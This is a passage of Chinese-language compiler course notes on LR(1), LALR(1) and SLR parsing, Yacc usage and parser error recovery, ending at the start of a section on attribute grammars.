&lt;p&gt;规约的条件更严格，也就“自动”消除了一些冲突，也就允许了更多语言被纳入该文法，因此 $\text{LR(0)} \in \text{SLR}$&lt;/p&gt;
&lt;p&gt;局限性：显然不能消除所有shift-reduce冲突。如果产生冲突对应的终结符t恰好在Follow集里，就无法消除。例如考虑如下文法：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;S&amp;#x27; -&amp;gt; S$&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;S -&amp;gt; L=R | R&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;L -&amp;gt; *R | id&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;R -&amp;gt; L&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;由于&lt;code&gt;R-&amp;gt;L&lt;/code&gt;这一产生式，容易看出Follow(R)&amp;#x3D;Follow(L)&lt;br&gt;然而’&amp;#x3D;’在Follow(L)中，因此我们遇到’L&amp;#x3D;…’时仍然不知道应该接受等于号进行shift(这样就可以进一步在&lt;code&gt;S-&amp;gt;L=R&lt;/code&gt;这个产生式中前进)，还是直接使用&lt;code&gt;R-&amp;gt;L&lt;/code&gt;进行reduce.&lt;br&gt;&lt;img src=&#34;/compiler-construction-principles/slr-conflict.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;我们需要更多、更精确的限制才能进一步降低冲突的可能。&lt;/p&gt;
&lt;h3 id=&#34;LR-1-Parsing&#34;&gt;&lt;a href=&#34;#LR-1-Parsing&#34; class=&#34;headerlink&#34; title=&#34;LR(1) Parsing&#34;&gt;&lt;/a&gt;LR(1) Parsing&lt;/h3&gt;&lt;p&gt;包含更多信息（后继token）来消除一些归约动作。&lt;br&gt;相当于“分裂”一些LR(0)状态，精确指明何时应该归约。&lt;/p&gt;
&lt;p&gt;LR(1)项(item)的形式：$ A \rightarrow \alpha \bullet \beta,\ a$&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;逗号后的a是**向前看符号(lookahead symbol)**即表明向前看一个终结符，可以是$&lt;/li&gt;
&lt;li&gt;和LR(0)对比，处理ε-move时记录合法的向前看符号w.&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;计算Closure&#34;&gt;&lt;a href=&#34;#计算Closure&#34; class=&#34;headerlink&#34; title=&#34;计算Closure&#34;&gt;&lt;/a&gt;计算Closure&lt;/h4&gt;&lt;p&gt;对于状态I中的一个item $$A\rightarrow \alpha X \beta,\ z$$ 以及一个产生式 $$X\rightarrow \gamma$$&lt;br&gt;我们寻找所有 $w\in \text{First}(\beta z)$ 然后加入I：$I\leftarrow I \cup {(X\rightarrow \bullet \gamma,\ w)}$&lt;br&gt;起始状态 $S’\rightarrow \bullet S $,\ ?$ 的闭包里不关心”?”处是什么，因为我们不会移进$&lt;br&gt;（所以一种可行的表示是把$都移到产生式外部，而非真的要产生一个”$“符号： $S’\rightarrow \bullet S,\ $$）&lt;/p&gt;
&lt;h4 id=&#34;计算Goto表&#34;&gt;&lt;a href=&#34;#计算Goto表&#34; class=&#34;headerlink&#34; title=&#34;计算Goto表&#34;&gt;&lt;/a&gt;计算Goto表&lt;/h4&gt;&lt;p&gt;基本和LR(0)算法保持相同，移入动作不考虑向前看符号z&lt;br&gt;也就是对于转移X，转移前后项的变换是：&lt;br&gt;$$A \rightarrow \alpha \bullet X \beta,\ z \ \ \Rightarrow\ \ A \rightarrow \alpha X \bullet \beta,\ z$$&lt;/p&gt;
&lt;h4 id=&#34;计算Action表：Reduce操作&#34;&gt;&lt;a href=&#34;#计算Action表：Reduce操作&#34; class=&#34;headerlink&#34; title=&#34;计算Action表：Reduce操作&#34;&gt;&lt;/a&gt;计算Action表：Reduce操作&lt;/h4&gt;&lt;p&gt;规约操作是变换较大的部分。&lt;br&gt;在LR(1)中，Action表项中Reduce操作形如$(I, z, A\rightarrow \alpha)$&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;I: 代表状态I对应的行&lt;/li&gt;
&lt;li&gt;z: 代表向前看符号&lt;/li&gt;
&lt;li&gt;$ A\rightarrow \alpha $ 为规约所采用的产生式&lt;br&gt;这就限制了从某个可规约项规约时，必须向前看一个符号以确保它是lookahead symbol.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;/compiler-construction-principles/lr1-items.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;局限性：这样的文法限制过少，过于灵活，导致状态数量过多，状态表过于庞大。&lt;br&gt;&lt;img src=&#34;/compiler-construction-principles/lr1-con.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;因此我们在SLR(1)&amp;#x3D;Simple LR(1)与LR(1)之间折中，可以得到一个新文法LALR(1).&lt;/p&gt;
&lt;h3 id=&#34;LALR-1-Parsing&#34;&gt;&lt;a href=&#34;#LALR-1-Parsing&#34; class=&#34;headerlink&#34; title=&#34;LALR(1) Parsing&#34;&gt;&lt;/a&gt;LALR(1) Parsing&lt;/h3&gt;&lt;p&gt;动机：发现很多LR(1)中的状态都只有lookahead symbol的区别。能否合并？&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;LALR(1): 把LR(1)中只有lookahead symbol不同的item合并。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;定义：把LR(1)中item的集合里所有lookahead symbol去掉，剩下的称为&lt;strong&gt;核(core)&lt;/strong&gt;&lt;br&gt;把LR(1)中所有核相同的状态两两合并为一个状态。每次合并都删除两个旧状态，新增一个新状态，入边出边的连接方式是显然的，直接接在新状态上即可。&lt;br&gt;新状态的item是两个旧状态的item的并（其实就是把每个item的lookahead symbol合并一下）。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/compiler-construction-principles/lr1-lalr1.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;这样得到的表将会小很多：与SLR的分析表&lt;strong&gt;一样大&lt;/strong&gt;！通常状态数只有LR(1)的十分之一。付出的微小代价：规约-规约冲突(reduce-reduce conflict)&lt;br&gt;例如对于如下文法：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;S -&amp;gt; a E c&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   | a F d&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   | b F c&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   | b E d&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;E -&amp;gt; e&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;F -&amp;gt; e&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;在LALR分析表中有两个状态会被合并成一个。而之后的下个字符将会出现歧义。这个冲突对应的状态：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;E -&amp;gt; e, &amp;#123;c,d&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;F -&amp;gt; e, &amp;#123;c,d&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;LR(1)分析器：将产生两个不同的状态(图中的状态#6与#9)，不会产生冲突：&lt;img src=&#34;/compiler-construction-principles/lr1-eg.png&#34; loading=&#34;lazy&#34;&gt;&lt;/li&gt;
&lt;li&gt;LALR(1)分析器：只会产生一个状态，产生冲突&lt;ul&gt;
&lt;li&gt;若下个输入字符为c或d，可以归约成E或F&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;因此，上述文法对于LALR(1)是二义的。&lt;br&gt;但这是可以接受的：LALR(1)足以处理绝大部分程序设计语言。&lt;/p&gt;
&lt;h2 id=&#34;Part-6-语法分析杂项&#34;&gt;&lt;a href=&#34;#Part-6-语法分析杂项&#34; class=&#34;headerlink&#34; title=&#34;Part 6: 语法分析杂项&#34;&gt;&lt;/a&gt;Part 6: 语法分析杂项&lt;/h2&gt;&lt;h3 id=&#34;语法分析器的生成器：YACC&#34;&gt;&lt;a href=&#34;#语法分析器的生成器：YACC&#34; class=&#34;headerlink&#34; title=&#34;语法分析器的生成器：YACC&#34;&gt;&lt;/a&gt;语法分析器的生成器：YACC&lt;/h3&gt;&lt;p&gt;Yacc &amp;#x3D; yet another compiler-compiler&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;基于LALR(1)&lt;/li&gt;
&lt;li&gt;BNF(Backus Naur Form)范式&lt;/li&gt;
&lt;li&gt;GNU版本名为&lt;em&gt;Bison&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;流程：&lt;ol&gt;
&lt;li&gt;Yacc源程序(*.y) &amp;gt;&amp;gt; Yacc Compiler &amp;gt;&amp;gt; C语言实现的LALR分析器(y.tab.c)&lt;/li&gt;
&lt;li&gt;y.tab.c &amp;gt;&amp;gt; C Compiler &amp;gt;&amp;gt; 分析器可执行文件(&lt;em&gt;.exe&amp;#x2F;&lt;/em&gt;.out)&lt;/li&gt;
&lt;li&gt;输入 &amp;gt;&amp;gt; 分析器可执行文件 &amp;gt;&amp;gt; 输出&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Lex: &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;一种词法分析器的生成器，将词法转化为词法解析器yylex()&lt;/li&gt;
&lt;li&gt;Yacc生成的yyparse()可以接受yylex()进而生成语法分析器&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;Yacc源程序结构&#34;&gt;&lt;a href=&#34;#Yacc源程序结构&#34; class=&#34;headerlink&#34; title=&#34;Yacc源程序结构&#34;&gt;&lt;/a&gt;Yacc源程序结构&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;声明&lt;ul&gt;
&lt;li&gt;C语言的声明&lt;/li&gt;
&lt;li&gt;词法单元的声明&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;翻译规则&lt;ul&gt;
&lt;li&gt;产生式&lt;/li&gt;
&lt;li&gt;产生式相关语义动作（例如编译时计算）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;辅助性C语言例程&lt;ul&gt;
&lt;li&gt;直接拷贝到生成的*.tab.c中&lt;/li&gt;
&lt;li&gt;可以在语义动作中调用&lt;/li&gt;
&lt;li&gt;Lex生成的yylex()就是其中之一，可以返回词法单元&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;对于示例文法：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;exp → exp addop term | term&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;addop → + | -&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;term → term mulop factor | factor&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mulop → *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;factor → ( exp ) | number&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;有示例程序：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;%&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;ctype.h&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;int yylex(void);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;int yyerror (char * s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;%&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;%token NUMBER&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;%%&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;command: exp &amp;#123;printf(&amp;quot;%d\n&amp;quot;, $1);&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;exp: exp &amp;#x27;+&amp;#x27; term &amp;#123;$$ = $1 + $3;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   | exp &amp;#x27;-&amp;#x27; term &amp;#123;$$ = $1 - $3;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   | term &amp;#123;$$ = $1&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;term: term &amp;#x27;*&amp;#x27; factor &amp;#123;$$ = $1 * $3;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    | factor &amp;#123;$$ = $1;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;factor: NUMBER &amp;#123;$$ = $1;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      | &amp;#x27;(&amp;#x27; exp &amp;#x27;)&amp;#x27; &amp;#123;$$ = $2;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;其中翻译规则Rule的格式为 &lt;code&gt;Rule &amp;#123;Action Code&amp;#125;&lt;/code&gt;，使用规则规约后Action Code就会被执行&lt;br&gt;语义动作形如 &lt;code&gt;$$ = $1 + $3&lt;/code&gt; &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;$$&lt;/code&gt; 表示和产生式头(LHS)相关的属性值&lt;/li&gt;
&lt;li&gt;&lt;code&gt;$i&lt;/code&gt; 表示产生式体中第i个文法符号（终结符&amp;#x2F;非终结符）的属性值&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;消除二义性与冲突解决&#34;&gt;&lt;a href=&#34;#消除二义性与冲突解决&#34; class=&#34;headerlink&#34; title=&#34;消除二义性与冲突解决&#34;&gt;&lt;/a&gt;消除二义性与冲突解决&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;消除二义性：&lt;ul&gt;
&lt;li&gt;指定运算符优先级：先出现的优先&lt;/li&gt;
&lt;li&gt;指定运算符结合律：&lt;code&gt;%left&lt;/code&gt;（左结合，例如乘法加法） &lt;code&gt;%right&lt;/code&gt;（右结合，例如一元运算符负号）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;冲突解决&lt;ul&gt;
&lt;li&gt;规约-规约冲突：先出现的产生式优先采用&lt;/li&gt;
&lt;li&gt;移进-规约冲突：移进优先采用&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;更通用的办法：通过改写文法，可以在消除冲突的同时减少二义性&lt;/p&gt;
&lt;h3 id=&#34;错误恢复-1&#34;&gt;&lt;a href=&#34;#错误恢复-1&#34; class=&#34;headerlink&#34; title=&#34;错误恢复&#34;&gt;&lt;/a&gt;错误恢复&lt;/h3&gt;&lt;p&gt;动机：一次性报告所有错误，而非遇到第一个就停下。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;局部错误恢复：调整Parse过程的栈，使其恢复到正常从而继续进行Parsing&lt;/li&gt;
&lt;li&gt;全局错误恢复：删除&amp;#x2F;插入尽可能少的字符，使得源字符串成为合法的字符串&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;局部错误恢复&#34;&gt;&lt;a href=&#34;#局部错误恢复&#34; class=&#34;headerlink&#34; title=&#34;局部错误恢复&#34;&gt;&lt;/a&gt;局部错误恢复&lt;/h4&gt;&lt;p&gt;Yacc中的一个方法：使用特殊的&lt;code&gt;error&lt;/code&gt;符号（终结符）控制恢复过程。&lt;br&gt;例如：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;exp -&amp;gt; ( error )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;exp -&amp;gt; error ; exp&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;于是通过这样的产生式，我们可以把错误的影响范围控制在右括号处&amp;#x2F;分号处。如果语法处理时遇到错误，可以一路跳过直到右括号和分号，然后继续处理。&lt;br&gt;分号、右括号这样的符号就被叫做synchronizing token.&lt;/p&gt;
&lt;p&gt;当语法分析器遇到错误时&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;不断弹出栈中状态，直到栈顶状态包含项 $ A \rightarrow \bullet error\ \alpha$&lt;/li&gt;
&lt;li&gt;分析器将error移入栈中&lt;/li&gt;
&lt;li&gt;如果α为空，分析器直接执行归约，并调用相关的语义&lt;br&gt;动作；否则跳过一些符号，找到可以归约为α的串为止&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;流程示例：&lt;br&gt;&lt;img src=&#34;/compiler-construction-principles/local-recovery.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;全局错误恢复&#34;&gt;&lt;a href=&#34;#全局错误恢复&#34; class=&#34;headerlink&#34; title=&#34;全局错误恢复&#34;&gt;&lt;/a&gt;全局错误恢复&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;不要求掌握。&lt;/strong&gt;&lt;br&gt;Burke-Fisher 错误恢复: 对于在发生错误处之前的K个token，每一处都允许插入&amp;#x2F;删除&amp;#x2F;修改一个token，直到修复成功。&lt;br&gt;优势：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;不引入新产生式，不改变文法&lt;/li&gt;
&lt;li&gt;也不改变分析表&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如何判定修复是否成功：修复后，在报告错误处继续Parsing直到下一个错误发生的距离最长（一般来说，修复后能从本来由于错误卡住的地方继续前进4个token就算成功了）。&lt;/p&gt;
&lt;p&gt;实现：维护K个token前的旧栈，以及K个token组成的队列。遇到错误后基于旧栈和增删改后的token队列（不一定是K个了）试图parse. 尝试不同的增删改方案直到修复成功：&lt;br&gt;&lt;img src=&#34;/compiler-construction-principles/burke-fisher.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;语义动作需要延迟到进入旧栈中（进入旧栈说明在解析流程中已经确定了）再进行&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;否则如果遇到错误，错误恢复发现原来的parsing方式不对时，文法符号的属性已经按照错误的方式运算了，回天乏术。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;语法分析小结：文法对比&#34;&gt;&lt;a href=&#34;#语法分析小结：文法对比&#34; class=&#34;headerlink&#34; title=&#34;语法分析小结：文法对比&#34;&gt;&lt;/a&gt;语法分析小结：文法对比&lt;/h2&gt;&lt;h3 id=&#34;SLR-与-LR-1&#34;&gt;&lt;a href=&#34;#SLR-与-LR-1&#34; class=&#34;headerlink&#34; title=&#34;SLR 与 LR(1)&#34;&gt;&lt;/a&gt;SLR 与 LR(1)&lt;/h3&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;SLR&lt;/th&gt;
&lt;th&gt;LR(1)&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;移   进&lt;/td&gt;
&lt;td&gt;$ A\rightarrow \alpha \bullet a \beta \in I_i \\ \text{Goto}(I_i,a)&amp;#x3D;I_j \\ \text{Action}[i,a]&amp;#x3D;s_j $&lt;/td&gt;
&lt;td&gt;$ A\rightarrow \alpha \bullet a \beta \in I_i \\ \text{Goto}(I_i,a)&amp;#x3D;I_j \\ \text{Action}[i,a]&amp;#x3D;s_j $&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;—&lt;/td&gt;
&lt;td&gt;—&lt;/td&gt;
&lt;td&gt;—&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;规   约&lt;/td&gt;
&lt;td&gt;$ A\rightarrow \alpha \bullet \in I_i \\ \alpha \in \text{Follow}(A) \\ \text{Action}[i,a]&amp;#x3D;r_j$&lt;/td&gt;
&lt;td&gt;$ A\rightarrow \alpha \bullet \in I_i \\ \text{Action}[i,a]&amp;#x3D;r_j $&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;可见唯一的区别就是SLR在规约时要求后继token是在Follow集里的。&lt;/p&gt;
&lt;h3 id=&#34;LL-1-与-LR-1&#34;&gt;&lt;a href=&#34;#LL-1-与-LR-1&#34; class=&#34;headerlink&#34; title=&#34;LL(1) 与 LR(1)&#34;&gt;&lt;/a&gt;LL(1) 与 LR(1)&lt;/h3&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;LR(1)&lt;/th&gt;
&lt;th&gt;LL(1)&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;建立分析树&lt;/td&gt;
&lt;td&gt;自底而上&lt;/td&gt;
&lt;td&gt;自顶而下&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;归约or推导&lt;/td&gt;
&lt;td&gt;规范归约(最右推导的逆)&lt;/td&gt;
&lt;td&gt;最左推导&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;分析表（行x列）&lt;/td&gt;
&lt;td&gt;状态×文法符号，大&lt;/td&gt;
&lt;td&gt;非终结符×终结符，小&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;分析栈&lt;/td&gt;
&lt;td&gt;状态栈，信息更多&lt;/td&gt;
&lt;td&gt;文法符号栈&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;ul&gt;
&lt;li&gt;LL(1): 对于多个可选产生式 $A\rightarrow \alpha_1|\alpha_2|…$ 向前看下一个输入根据First,Follow确定使用哪条产生式推导&lt;/li&gt;
&lt;li&gt;LR(1): 对于多个可选产生式 $A\rightarrow \alpha,\ B\rightarrow \alpha,… $ 在识别出整个$\alpha$后，再往前看1个符号，然后确定使用哪条产生式归约&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;LL-1-LR-1-SLR&#34;&gt;&lt;a href=&#34;#LL-1-LR-1-SLR&#34; class=&#34;headerlink&#34; title=&#34;LL(1) LR(1) SLR&#34;&gt;&lt;/a&gt;LL(1) LR(1) SLR&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;/compiler-construction-principles/grammar-compare.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;Part-7-抽象语法&#34;&gt;&lt;a href=&#34;#Part-7-抽象语法&#34; class=&#34;headerlink&#34; title=&#34;Part 7: 抽象语法&#34;&gt;&lt;/a&gt;Part 7: 抽象语法&lt;/h2&gt;&lt;p&gt;编程语言 &amp;#x3D; 语法（识别一个合法的程序） + 语义（这个合法的程序对应的实际行为）&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;语法：已经在之前章节讨论过。&lt;/li&gt;
&lt;li&gt;语义：&lt;ul&gt;
&lt;li&gt;操作语义：如何执行程序？&lt;/li&gt;
&lt;li&gt;&lt;del&gt;公理语义：我们可以证明程序的那些性质？&lt;/del&gt;（该部分不在本课讨论）&lt;/li&gt;
&lt;li&gt;指称语义：程序是做什么的？&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;属性文法Attribute-Grammar&#34;&gt;&lt;a href=&#34;#属性文法Attribute-Grammar&#34; class=&#34;headerlink&#34; title=&#34;属性文法Attribute Grammar&#34;&gt;&lt;/a&gt;属性文法Attribute Grammar&lt;/h3&gt;&lt;p&gt;属性文法&amp;#x3D;&lt;strong&gt;上下文无关文法+属性+属性计算规则&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;属性:&amp;#x3D; 描述文法符号的语义特征，比如表达式E的值我们可以记为E.val&lt;/li&gt;
&lt;li&gt;属性计算规则(语义规则):&amp;#x3D; 与产生式相关联、反映文法符号属性之间关系的规则，比如在乘法表达式中左侧的E.val要如何计算&lt;ul&gt;
&lt;li&gt;仅表明属性间“抽象”关系，不涉及计算次序等具体实现细节&lt;/li&gt;
&lt;/ul&gt;
